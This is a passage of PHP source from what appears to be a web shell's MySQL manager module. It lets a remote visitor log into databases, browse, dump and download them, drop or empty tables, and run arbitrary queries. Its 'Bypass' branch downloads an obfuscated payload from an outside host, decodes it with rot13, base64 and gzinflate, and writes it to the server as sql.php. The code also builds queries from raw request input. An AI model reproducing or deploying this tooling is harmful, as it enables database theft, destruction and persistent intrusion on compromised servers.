  if($x=="sql") {
    foreach(array("sort","sql_sort") as $v) {
      if(!empty($_GET[$v])) {
        $$v=$_GET[$v];
      }
      if(!empty($_POST[$v])) {
        $$v=$_POST[$v];
      }
    }
    if($sort_save) {
      if(!empty($sort)) {
        setcookie("sort",$sort);
      }
      if(!empty($sql_sort)) {
        setcookie("sql_sort",$sql_sort);
      }
    }
    if(!isset($sort)) {
      $sort=$sort_default;
    }
    $sort=htmlspecialchars($sort);
    $sort[1]=strtolower($sort[1]);
    echo html_style();
    echo "<div id='maininfo'>";
    if($x=="sql") {
      $sql_surl=$surl."x=sql";
      if(!isset($sql_login)) {
        $sql_login="";
      }
      if(!isset($sql_passwd)) {
        $sql_passwd="";
      }
      if(!isset($sql_server)) {
        $sql_server="";
      }
      if(!isset($sql_port)) {
        $sql_port="";
      }
      if(!isset($sql_tbl)) {
        $sql_tbl="";
      }
      if(!isset($sql_x)) {
        $sql_x="";
      }
      if(!isset($sql_tbl_x)) {
        $sql_tbl_x="";
      }
      if(!isset($sql_order)) {
        $sql_order="";
      }
      if(!isset($sql_x)) {
        $sql_x="";
      }
      if(!isset($sql_getfile)) {
        $sql_getfile="";
      }
      if(@$sql_login) {
        $sql_surl.="&sql_login=".htmlspecialchars($sql_login);
      }
      if(@$sql_passwd) {
        $sql_surl.="&sql_passwd=".htmlspecialchars($sql_passwd);
      }
      if(@$sql_server) {
        $sql_surl.="&sql_server=".htmlspecialchars($sql_server);
      }
      if(@$sql_port) {
        $sql_surl.="&sql_port=".htmlspecialchars($sql_port);
      }
      if(@$sql_db) {
        $sql_surl.="&sql_db=".htmlspecialchars($sql_db);
      }
      $sql_surl.="&";
      echo "";
      if(@$sql_server) {
        $sql_sock=@mysql_connect($sql_server.":".$sql_port,$sql_login,$sql_passwd);
        $err=mysql_smarterror($sql_sock);
        @mysql_select_db($sql_db,$sql_sock);
        if(@$sql_queryand$submit) {
          $sql_query_result=mysql_query($sql_query,$sql_sock);
          $sql_query_error=mysql_smarterror($sql_sock);
        }
      }
      else {
        $sql_sock=FALSE;
      }
      if(!$sql_sock) {
        if(!@$sql_server) {
          if($_GET['ins']=="sql") {
            $sqlshell=file_get_contents('http://syntax-errorz.googlecode.com/svn/trunk/sql.php');
            $file=fopen("sql.php","w+");
            $write=fwrite($file,gzinflate(base64_decode(str_rot13(strrev($sqlshell)))));
            fclose($file);
            chmod("sql.php",0644);
            echo "[Mysql] : Install Done, <a href='".$alamat."/sql.php' target='_blank'>sql.php</a>";
          }
          else {
            echo "[Mysql] : No Connection, <a href='".$surl."x=sql&ins=sql'>Bypass</a>";
          }
        }
        else {
          disp_error("ERROR: ".$err);
        }
      }
      else {
        $sqlquicklaunch=array();
        $sqlquicklaunch[]=array("Index",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
        $sqlquicklaunch[]=array("Query",$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl));
        $sqlquicklaunch[]=array("Server status",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=serverstatus");
        $sqlquicklaunch[]=array("Server variables",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=servervars");
        $sqlquicklaunch[]=array("Processes",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=processes");
        $sqlquicklaunch[]=array("Logout",$surl."x=sql");
        echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info().") Server: ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")<br/>";
        if(count($sqlquicklaunch)>0) {
          foreach($sqlquicklaunch as $item) {
            echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";
          }
        }
      }
      echo "</div>";
      echo "<table class='tab'><tr>";
      if(!$sql_sock) {
        echo '<td>
<form name="f_sql" action="'.$surl.'x=sql" method="POST">
<input type="hidden" name="x" value="sql">
<table class="tabnet" style="padding:1px;">
<tr><th colspan="2">Mysql Manager</th></tr>
<tr><td>Username</td><td><input type="text" name="sql_login" value="" style="width:250px;" class="inputz"></td></tr>
<tr><td>Password</td><td><input type="password" name="sql_passwd" value="" style="width:250px;" class="inputz"></td></tr>
<tr><td>Database</td><td><input type="text" name="sql_db" value="" style="width:250px;" class="inputz"></td></tr>
<tr><td>Host</td><td><input type="text" name="sql_server" value="localhost" class="inputz"></td></tr>
<tr><td>Port</td><td><input type="text" name="sql_port" value="3306" size="3" class="inputz"></td></tr>
<tr><th colspan="5"><input type="submit" value="Connect" class="inputzbut"></th></tr>
</table>
</form>';
      }
      else {
        echo '<td valign="top" style="border:1px solid #333333;">
<center>
<a href="'.$sql_surl.'"><b class="gaya">HOME</b></a>
<hr size="1" noshade>';
        $result=mysql_list_dbs($sql_sock);
        if(!$result) {
          echo mysql_smarterror();
        }
        else {
          echo '<form action="'.$surl.'x=sql">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<select name="sql_db" onchange="this.form.submit()" style="width:100%;" class="inputz">';
          $c=0;
          $dbs="";
          while($row=mysql_fetch_row($result)) {
            $dbs.="\t\t<option value=\"".$row[0]."\"";
            if(@$sql_db==$row[0]) {
              $dbs.=" selected";
            }
            $dbs.=">".$row[0]."</option>\n";
            $c++;
          }
          echo "\t\t<option value=\"\">Databases (".$c.")</option>\n";
          echo $dbs;
        }
        echo '</select>
<hr size="1" noshade>
</form>
</center>';
        if(isset($sql_db)) {
          $result=mysql_list_tables($sql_db);
          if(!$result) {
            $result=mysql_list_dbs($sql_sock);
            $num=mysql_num_rows($result);
            for($i=0;$i<$num;$i++) {
              $dbname=mysql_dbname($result,$i);
              echo "<table class='tab'><td style='background:#3F3F3F;border:1px solid #202020;border-top: 1px solid #505050;border-left: 1px solid #505050;'><b>+ <a href=\"".$sql_surl."sql_db=".$dbname."\" class=\"gaya\">$dbname</a></b></td></table>";
            }
          }
          else {
            echo "\t<table class='tub'><th><a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a></th></table><br/>\n";
            $c=0;
            while($row=mysql_fetch_array($result)) {
              $count=mysql_query("SELECT COUNT(*) FROM ".$row[0]);
              $count_row=mysql_fetch_array($count);
              echo "\t<b>+ <a class='gaya' href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\">".htmlspecialchars($row[0])."</a></b> (".$count_row[0].")</br></b>\n";
              mysql_free_result($count);
              $c++;
            }
            if(!$c) {
              echo "No tables found in database";
            }
          }
        }
        echo '</td>';
        echo '<td style="border:1px solid #333333;" valign="top">';
        $diplay=TRUE;
        if(@$sql_db) {
          if(!is_numeric($c)) {
            $c=0;
          }
          if($c==0) {
            $c="no";
          }
          echo "\t<center><b>There are ".$c." table(s) in database: ".htmlspecialchars($sql_db)."";
          if(count(@$dbquicklaunch)>0) {
            foreach($dbsqlquicklaunch as $item) {
              echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";
            }
          }
          echo "</b></center>\n";
          $xs=array("","dump");
          if($sql_x=="tbldrop") {
            $sql_query="DROP TABLE";
            foreach($boxtbl as $v) {
              $sql_query.="\n`".$v."` ,";
            }
            $sql_query=substr($sql_query,0,-1).";";
            $sql_x="query";
          }
          elseif($sql_x=="tblempty") {
            $sql_query="";
            foreach($boxtbl as $v) {
              $sql_query.="DELETE FROM `".$v."` \n";
            }
            $sql_x="query";
          }
          elseif($sql_x=="tbldump") {
            if(count($boxtbl)>0) {
              $dmptbls=$boxtbl;
            }
            elseif($thistbl) {
              $dmptbls=array($sql_tbl);
            }
            $sql_x="dump";
          }
          elseif($sql_x=="tblcheck") {
            $sql_query="CHECK TABLE";
            foreach($boxtbl as $v) {
              $sql_query.="\n`".$v."` ,";
            }
            $sql_query=substr($sql_query,0,-1).";";
            $sql_x="query";
          }
          elseif($sql_x=="tbloptimize") {
            $sql_query="OPTIMIZE TABLE";
            foreach($boxtbl as $v) {
              $sql_query.="\n`".$v."` ,";
            }
            $sql_query=substr($sql_query,0,-1).";";
            $sql_x="query";
          }
          elseif($sql_x=="tblrepair") {
            $sql_query="REPAIR TABLE";
            foreach($boxtbl as $v) {
              $sql_query.="\n`".$v."` ,";
            }
            $sql_query=substr($sql_query,0,-1).";";
            $sql_x="query";
          }
          elseif($sql_x=="tblanalyze") {
            $sql_query="ANALYZE TABLE";
            foreach($boxtbl as $v) {
              $sql_query.="\n`".$v."` ,";
            }
            $sql_query=substr($sql_query,0,-1).";";
            $sql_x="query";
          }
          elseif($sql_x=="deleterow") {
            $sql_query="";
            if(!empty($boxrow_all)) {
              $sql_query="DELETE * FROM `".$sql_tbl."`;";
            }
            else {
              foreach($boxrow as $v) {
                $sql_query.="DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";
              }
              $sql_query=substr($sql_query,0,-1);
            }
            $sql_x="query";
          }
          elseif($sql_tbl_x=="insert") {
            if($sql_tbl_insert_radio==1) {
              $keys="";
              $akeys=array_keys($sql_tbl_insert);
              foreach($akeys as $v) {
                $keys.="`".addslashes($v)."`, ";
              }
              if(!empty($keys)) {
                $keys=substr($keys,0,strlen($keys)-2);
              }
              $values="";
              $i=0;
              foreach(array_values($sql_tbl_insert) as $v) {
                if($funct=$sql_tbl_insert_functs[$akeys[$i]]) {
                  $values.=$funct." (";
                }
                $values.="'".addslashes($v)."'";
                if($funct) {
                  $values.=")";
                }
                $values.=", ";
                $i++;
              }
              if(!empty($values)) {
                $values=substr($values,0,strlen($values)-2);
              }
              $sql_query="INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
              $sql_x="query";
              $sql_tbl_x="browse";
            }
            elseif($sql_tbl_insert_radio==2) {
              $set=mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
              $sql_query="UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
              $result=mysql_query($sql_query)orprint(mysql_smarterror());
              $result=mysql_fetch_array($result,MYSQL_ASSOC);
              $sql_x="query";
              $sql_tbl_x="browse";
            }
          }
          if($sql_x=="query") {
            echo "<hr size=\"1\" noshade>";
            if(($submit)and(!$sql_query_result)and($sql_confirm)) {
              if(!$sql_query_error) {
                $sql_query_error="Query was empty";
              }
              echo "<b>Error:</b> <br/>".$sql_query_error."<br/>";
            }
            if($sql_query_resultor(!$sql_confirm)) {
              $sql_x=$sql_goto;
            }
            if((!$submit)or($sql_x)) {
              echo "<table class='tab'><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>";
              if(($sql_query)and(!$submit)) {
                echo "Do you really want to:";
              }
              else {
                echo "SQL-Query :";
              }
              echo "</b><br/><br/><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br/><br/><input type=\"hidden\" name=\"sql_x\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\" class=\"inputzbut\"> <input type=\"submit\" value=\"No\" class=\"inputzbut\"></form></td></tr></table>";
            }
          }
          if(in_array($sql_x,$xs)) {
            echo '<table class="tab">
<tr>
<td style="border:1px solid #333333;padding:3px;">
<b>Create new table:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="newtbl">
<input type="hidden" name="sql_db" value="'.htmlspecialchars($sql_db).'">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="sql_newtbl" size="20" class="inputz">
Fields: <input type="text" name="sql_field" size="3" class="inputz">
<input type="submit" value="Create" class="inputzbut">
</form>
</td>
<td style="border:1px solid #333333;padding:3px;"><b>Dump DB:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="dump">
<input type="hidden" name="sql_db" value="'.htmlspecialchars($sql_db).'">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="dump_file" size="30" value="dump_'.getenv("SERVER_NAME").'_'.$sql_db.'_'.date("d-m-Y-H-i-s").'.sql" class="inputz">
<input type="submit" name="submit" value="Dump" class="inputzbut">
</form>
</td>
</tr>
</table>';
            if(!empty($sql_x)) {
              echo "<hr size=\"1\" noshade>";
            }
            if($sql_x=="newtbl") {
              echo "<b>";
              if((mysql_create_db($sql_newdb))and(!empty($sql_newdb))) {
                echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br/>";
              }
              else {
                echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br/>Reason:</b> ".mysql_smarterror();
              }
            }
            elseif($sql_x=="dump") {
              if(empty($submit)) {
                $diplay=FALSE;
                echo "<form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_x\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br/><br/>";
                echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\" class=\"inputz\"><br/><br/>";
                $v=join(";",$dmptbls);
                echo "<b>Only tables (explode \";\") :</b> <input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\" class=\"inputz\"><br/><br/>";
                if($dump_file) {
                  $tmp=$dump_file;
                }
                else {
                  $tmp=htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");
                }
                echo "<b>File:</b> <input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp)%30)."\" class=\"inputz\"><br/><br/>";
                echo "<b>Download: </b> <input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br/><br/>";
                echo "<b>Save to file: </b> <input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
                echo "<br/><br/><input type=\"submit\" name=\"submit\" value=\"Dump\" class=\"inputzbut\">";
                echo "</form>";
              }
              else {
                $diplay=TRUE;
                $set=array();
                $set["sock"]=$sql_sock;
                $set["db"]=$sql_db;
                $dump_out="download";
                $set["print"]=0;
                $set["nl2br"]=0;
                $set[""]=0;
                $set["file"]=$dump_file;
                $set["add_drop"]=TRUE;
                $set["onlytabs"]=array();
                if(!empty($dmptbls)) {
                  $set["onlytabs"]=explode(";",$dmptbls);
                }
                $ret=mysql_dump($set);
                if($sql_dump_download) {
                  @ob_clean();
                  header("Content-type: application/octet-stream");
                  header("Content-length: ".strlen($ret));
                  header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
                  echo '<table class="tabnet" style="padding:2px;margin:2px;"><tr><td>'.$ret.'</td></tr></table>';
                  exit;
                }
                elseif($sql_dump_savetofile) {
                  $fp=fopen($sql_dump_file,"w");
                  if(!$fp) {
                    echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";
                  }
                  else {
                    fwrite($fp,$ret);
                    fclose($fp);
                    echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
                  }
                }
                else {
                  echo "<b>Dump: nothing to do!</b>";
                }
              }
            }
            if($diplay) {
              if(!empty($sql_tbl)) {
                if(empty($sql_tbl_x)) {
                  $sql_tbl_x="browse";
                }
                $count=mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
                $count_row=mysql_fetch_array($count);
                mysql_free_result($count);
                $tbl_struct_result=mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
                $tbl_struct_fields=array();
                while($row=mysql_fetch_assoc($tbl_struct_result)) {
                  $tbl_struct_fields[]=$row;
                }
                if(@$sql_ls>@$sql_le) {
                  $sql_le=$sql_ls+$perpage;
                }
                if(empty($sql_tbl_page)) {
                  $sql_tbl_page=0;
                }
                if(empty($sql_tbl_ls)) {
                  $sql_tbl_ls=0;
                }
                if(empty($sql_tbl_le)) {
                  $sql_tbl_le=30;
                }
                $perpage=$sql_tbl_le-$sql_tbl_ls;
                if(!is_numeric($perpage)) {
                  $perpage=10;
                }
                $numpages=$count_row[0]/$perpage;
                $e=explode(" ",$sql_order);
                if(count($e)==2) {
                  if($e[0]=="d") {
                    $asc_desc="DESC";
                  }
                  else {
                    $asc_desc="ASC";
                  }
                  $v="ORDER BY `".$e[1]."` ".$asc_desc." ";
                }
                else {
                  $v="";
                }
                $query="SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
                $result=mysql_query($query)orprint(mysql_smarterror());
                echo "<center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
                echo "<hr size=\"1\" noshade>";
                echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=structure\">[<b> Structure </b>]</a> &nbsp; ";
                echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=browse\">[<b> Browse </b>]</a> &nbsp; ";
                echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_x=tbldump&thistbl=1\">[<b> Dump </b>]</a> &nbsp; ";
                echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a> &nbsp; ";
                if($sql_tbl_x=="structure") {
                  echo "<b>Under construction!</b>";
                }
                if($sql_tbl_x=="insert") {
                  if(!is_array($sql_tbl_insert)) {
                    $sql_tbl_insert=array();
                  }
                  if(!empty($sql_tbl_insert_radio)) {
                    echo "<b>Under construction!</b>";
                  }
                  else {
                    echo "<hr size=\"1\" noshade><br/><b>Inserting row into table:</b><br/>";
                    if(!empty($sql_tbl_insert_q)) {
                      $sql_query="SELECT * FROM `".$sql_tbl."`";
                      $sql_query.=" WHERE".$sql_tbl_insert_q;
                      $sql_query.=" LIMIT 1;";
                      $result=mysql_query($sql_query,$sql_sock)orprint("<br/><br/>".mysql_smarterror());
                      $values=mysql_fetch_assoc($result);
                      mysql_free_result($result);
                    }
                    else {
                      $values=array();
                    }
                    echo "<form method=\"POST\"><table width=\"1%\" class='tub'><tr><th><b>Field</b></th><th><b>Type</b></th><th><b>Function</b></th><th><b>Value</b></th></tr>";
                    foreach($tbl_struct_fields as $field) {
                      $name=$field["Field"];
                      if(empty($sql_tbl_insert_q)) {
                        $v="";
                      }
                      echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\" class=\"inputz\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50 class=\"inputz\"></td></tr>";
                      $i++;
                    }
                    echo "</table><br/>";
                    echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\"";
                    if(empty($sql_tbl_insert_q)) {
                      echo " checked";
                    }
                    echo "><b>Insert as new row</b>";
                    if(!empty($sql_tbl_insert_q)) {
                      echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>";
                      echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";
                    }
                    echo "<br/><br/><input type=\"submit\" value=\"Confirm\" class=\"inputzbut\"></form>";
                  }
                }
                if($sql_tbl_x=="browse") {
                  $sql_tbl_ls=abs($sql_tbl_ls);
                  $sql_tbl_le=abs($sql_tbl_le);
                  echo "<hr size=\"1\" noshade>";
                  echo "<b>Page: </b>";
                  $b=0;
                  for($i=0;$i<$numpages;$i++) {
                    if(($i*$perpage!=$sql_tbl_ls)or($i*$perpage+$perpage!=$sql_tbl_le)) {
                      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";
                    }
                    echo $i;
                    if(($i*$perpage!=$sql_tbl_ls)or($i*$perpage+$perpage!=$sql_tbl_le)) {
                      echo "</u></a>";
                    }
                    if(($i/30==round($i/30))and($i>0)) {
                      echo "<br/>";
                    }
                    else {
                      echo " ";
                    }
                  }
                  if($i==0) {
                    echo "empty";
                  }
                  echo "<br/><br/><form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b> <input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\" class=\"inputz\"> <b>To:</b> <input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\" class=\"inputz\"> <input type=\"submit\" value=\"View\" class=\"inputzbut\"></form>";
                  echo "<br/><form method=\"POST\">\n";
                  echo "<table class='tub'><tr>";
                  echo "<th width=\"25px\"><input type=\"checkbox\" onclick=\"checkAll(this)\" /></th>";
                  for($i=0;$i<mysql_num_fields($result);$i++) {
                    $v=mysql_field_name($result,$i);
                    if($e[0]=="a") {
                      $s="d";
                      $m="asc";
                    }
                    else {
                      $s="a";
                      $m="desc";
                    }
                    echo "<th>";
                    if(empty($e[0])) {
                      $e[0]="a";
                    }
                    if(@$e[1]!=$v) {
                      echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";
                    }
                    else {
                      echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."x=img&img=sort_".$m."\" alt=\"".$m."\"></a>";
                    }
                    echo "</th>";
                  }
                  echo "<th><font color=\"#00FF00\"><b>action</b></font></th>";
                  echo "</tr>";
                  while($row=mysql_fetch_array($result,MYSQL_ASSOC)) {
                    echo "<tr>";
                    $w="";
                    $i=0;
                    foreach($row as $k=>$v) {
                      $name=mysql_field_name($result,$i);
                      $w.=" `".$name."` = '".addslashes($v)."' AND";
                      $i++;
                    }
                    if(count($row)>0) {
                      $w=substr($w,0,strlen($w)-3);
                    }
                    echo "<td align='center' style='padding:0px;width:25px;'><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\" onchange=\"hilite(this);\"></td>";
                    $i=0;
                    foreach($row as $k=>$v) {
                      $v=htmlspecialchars($v);
                      if($v=="") {
                        $v="<font color=\"#00FF00\">NULL</font>";
                      }
                      echo "<td>".$v."</td>";
                      $i++;
                    }
                    echo "<td>";
                    echo "<a href=\"".$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\">Delete</a>";
                    echo "&nbsp;|&nbsp;";
                    echo "<a href=\"".$sql_surl."sql_tbl_x=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\">Edit</a> ";
                    echo "</td>";
                    echo "</tr>";
                  }
                  mysql_free_result($result);
                  echo "</table><hr size=\"1\" noshade><p align=\"left\"><input type=\"checkbox\" onclick=\"checkAll(this)\" name=\"dis\"/> <select name=\"sql_x\" class=\"inputz\">";
                  echo "<option value=\"\">With selected:</option>";
                  echo "<option value=\"deleterow\">Delete</option>";
                  echo "</select> <input type=\"submit\" value=\"Confirm\" class=\"inputzbut\"></form></p>";
                }
              }
              else {
                $result=mysql_query("SHOW TABLE STATUS",$sql_sock);
                if(!$result) {
                  echo mysql_smarterror();
                }
                else {
                  echo '<form method="POST">
<table class="tub">
<tr><th width="25px"><input type="checkbox" onclick="checkAll(this)" /></th><th>Table</th><th>Rows</th><th>Engine</th><th>Created</th><th>Modified</th><th>Size</th><th>Action</th></tr>';
                  $i=0;
                  $tsize=$trows=0;
                  while($row=mysql_fetch_array($result,MYSQL_ASSOC)) {
                    $tsize+=$row["Data_length"];
                    $trows+=$row["Rows"];
                    $size=view_size($row["Data_length"]);
                    echo '<tr>
<td align="center" style="padding:0px;width:25px;"><input type="checkbox" name="boxtbl[]" value="'.$row["Name"].'" onchange="hilite(this);"></td>
<td><a href="'.$sql_surl.'sql_tbl='.urlencode($row["Name"]).'" class="gaya"><b>'.$row["Name"].'</b></a></td>
<td>'.$row["Rows"].'</td><td>'.$row["Engine"].'</td><td>'.$row["Create_time"].'</td><td>'.$row["Update_time"].'</td><td>'.$size.'</td>
<td><a href="'.$sql_surl.'sql_x=query&sql_query='.urlencode("DELETE FROM `".$row["Name"]."`").'">Empty</a>&nbsp;|&nbsp;<a href="'.$sql_surl.'sql_x=query&sql_query='.urlencode("DROP TABLE `".$row["Name"]."`").'">Drop</a>&nbsp;|&nbsp;<a href="'.$sql_surl.'sql_tbl_x=insert&sql_tbl='.$row["Name"].'">Insert</a></td>
</tr>';
                    $i++;
                  }
                  echo "\t\t<tr>\n"."\t\t<th><input type=\"checkbox\" onclick=\"checkAll(this)\" /></th><th>$i table(s)</th><th>$trows</th><th>$row[1]</th><th>$row[10]</th><th>$row[11]</th><th>".view_size($tsize)."</th><th></th>\n";
                  echo '</tr>
</table>
<br/>
<div align="right">
<select name="sql_x" class="inputz">
<option value="">With selected:</option>
<option value="tbldrop">Drop</option>
<option value="tblempty">Empty</option>";
<option value="tbldump">Dump</option>";
<option value="tblcheck">Check table</option>";
<option value="tbloptimize">Optimize table</option>";
<option value="tblrepair">Repair table</option>";
<option value="tblanalyze">Analyze table</option>";
</select>
<input type="submit" value="Confirm" class="inputzbut">
</div>
</form>';
                  mysql_free_result($result);
                }
              }
            }
          }
        }
        else {
          $xs=array("","newdb","serverstatus","servervars","processes","getfile");
          if(in_array($sql_x,$xs)) {
            echo '<table class="tab">
<tr>
<td style="border:1px solid #333333;padding:3px;"><b>Create new DB:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="newdb">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="sql_newdb" size="20" class="inputz">
